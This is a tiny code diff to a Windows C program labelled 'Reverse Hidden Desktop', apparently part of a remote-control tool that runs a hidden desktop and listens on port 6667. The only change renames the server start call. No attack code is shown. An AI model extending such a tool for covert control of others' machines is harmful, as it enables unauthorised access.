@@ -20,7 +20,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	wprintf(TEXT("Reverse Hidden Desktop: \n\n"));
 
 	//if(!StartServer(atoi(lpCmdLine)))
-	if (!StartServer(6667))
+	if (!StartServer2(6667))
 	{
 		wprintf(TEXT("Could not start the server (Error: %d)\n"), WSAGetLastError());
 			getchar();
